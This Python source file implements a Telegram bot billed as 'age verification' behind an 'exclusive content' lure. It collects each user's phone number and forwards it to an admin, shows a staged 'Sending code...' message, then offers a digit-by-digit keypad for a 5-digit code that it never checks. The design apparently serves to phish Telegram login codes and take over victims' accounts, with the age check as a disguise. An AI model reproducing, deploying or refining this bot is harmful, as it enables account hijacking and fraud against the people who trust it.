import logging
import random
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import sqlite3
from datetime import datetime

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration - Wala nang default fallback para mas secure
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '6483793776'))

class AgeVerificationBot:
    def __init__(self):
        self.init_database()
        self.verification_sessions = {}
        
    def init_database(self):
        """Initialize SQLite database"""
        self.conn = sqlite3.connect('age_verification.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                verified BOOLEAN DEFAULT 0,
                created_at DATETIME,
                verified_at DATETIME
            )
        ''')
        
        self.conn.commit()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command - Request contact"""
        user = update.message.from_user
        
        # Check if already verified
        cursor = self.conn.cursor()
        cursor.execute('SELECT verified FROM users WHERE user_id = ?', (user.id,))
        result = cursor.fetchone()
        
        if result and result[0]:
            await update.message.reply_text(
                "✅ **Already Verified!**\n\nYou're already age-verified in our system. No need to verify again!",
                parse_mode='Markdown'
            )
            return
        
        welcome_text = f"""
🌟 **Excited to explore something fresh and thrilling?**
🚀 **Confirm your age to unlock an exclusive content collection!**
⚡ **Act fast — spots are limited!**

Hello {user.first_name}! 

**Step 1:** Share your phone number to receive verification code.

👇 Click the button below to share your contact.
        """
        
        # Contact sharing button
        contact_keyboard = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Share My Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            welcome_text, 
            parse_mode='Markdown',
            reply_markup=contact_keyboard
        )

    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact sharing"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            # Verify it's user's own contact
            if contact.user_id != user.id:
                await update.message.reply_text(
                    "❌ Please share your own contact, not someone else's.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            # Generate verification code
            verification_code = str(random.randint(10000, 99999))
            
            # Save to database
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO users 
                (user_id, username, first_name, phone_number, verification_code, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user.id, user.username, user.first_name, contact.phone_number, verification_code, datetime.now()))
            self.conn.commit()
            
            # Remove keyboard
            await update.message.reply_text(
                "👇",
                reply_markup=ReplyKeyboardRemove()
            )
            
            # Send "Sending code..." message
            sending_msg = await update.message.reply_text(
                "📨 **Sending code...**",
                parse_mode='Markdown'
            )
            
            # Wait a bit for realism
            await context.application.bot.send_chat_action(user.id, "typing")
            
            # Update to "Enter the code!"
            await sending_msg.edit_text(
                "✅ **Enter the code!**",
                parse_mode='Markdown'
            )
            
            # Send code input interface
            await self.send_code_input_interface(context, user.id, verification_code)
            
            # Notify admin with the code
            await context.bot.send_message(
                ADMIN_ID,
                f"""
📱 **New Verification Request**

👤 User: {user.first_name} (@{user.username})
📞 Phone: `{contact.phone_number}`
🔢 Generated Code: `{verification_code}`

**Note:** Send this code to the user via SMS.
                """,
                parse_mode='Markdown'
            )
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await update.message.reply_text("❌ Error processing. Please try /start again.")

    async def send_code_input_interface(self, context, user_id, verification_code):
        """Send numeric keypad interface"""
        try:
            # Create numeric keyboard (styled like the photo)
            keyboard = [
                [
                    InlineKeyboardButton('1', callback_data=f'n_1_{user_id}'),
                    InlineKeyboardButton('2', callback_data=f'n_2_{user_id}'),
                    InlineKeyboardButton('3', callback_data=f'n_3_{user_id}')
                ],
                [
                    InlineKeyboardButton('4', callback_data=f'n_4_{user_id}'),
                    InlineKeyboardButton('5', callback_data=f'n_5_{user_id}'),
                    InlineKeyboardButton('6', callback_data=f'n_6_{user_id}')
                ],
                [
                    InlineKeyboardButton('7', callback_data=f'n_7_{user_id}'),
                    InlineKeyboardButton('8', callback_data=f'n_8_{user_id}'),
                    InlineKeyboardButton('9', callback_data=f'n_9_{user_id}')
                ],
                [
                    InlineKeyboardButton('0', callback_data=f'n_0_{user_id}')
                ],
                [
                    InlineKeyboardButton('👉 Get code!', url='https://t.me/+42777')
                ]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            message = """
**Enter your verification code:**

Code: ` - - - - - `

Use the buttons below to enter your 5-digit code.
            """
            
            await context.bot.send_message(
                user_id,
                message,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            
            # Initialize session
            self.verification_sessions[user_id] = {
                'code': '',
                'correct_code': verification_code
            }
            
        except Exception as e:
            logger.error(f"Error sending interface: {e}")

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button presses"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            
            await query.answer()
            
            # Check session
            if user_id not in self.verification_sessions:
                await query.edit_message_text("❌ Session expired. Please /start again.")
                return
            
            session = self.verification_sessions[user_id]
            data = query.data
            
            # Number pressed
            if data.startswith('n_'):
                number = data.split('_')[1]
                
                if len(session['code']) < 5:
                    session['code'] += number
                    
                # Update display
                display = ' '.join(session['code'].ljust(5, '-'))
                
                await query.edit_message_text(
                    f"""
**Enter your verification code:**

Code: ` {display} `

Use the buttons below to enter your 5-digit code.
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                    
        except Exception as e:
            logger.error(f"Error in callback: {e}")
            await query.edit_message_text("❌ Error occurred. Please /start again.")

    async def stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin stats"""
        if update.message.from_user.id != ADMIN_ID:
            return
        
        cursor = self.conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM users WHERE verified = 1')
        verified = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total = cursor.fetchone()[0]
        
        await update.message.reply_text(
            f"""
📊 **Bot Statistics**

✅ Verified Users: {verified}
📝 Total Users: {total}
⏳ Pending: {total - verified}
            """,
            parse_mode='Markdown'
        )

def main():
    """Run the bot"""
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN environment variable is not set!")
        logger.error("Please set BOT_TOKEN in Railway environment variables.")
        return
    
    bot = AgeVerificationBot()
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("stats", bot.stats))
    application.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
    application.add_handler(CallbackQueryHandler(bot.handle_callback))
    
    logger.info("🚀 Bot started!")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
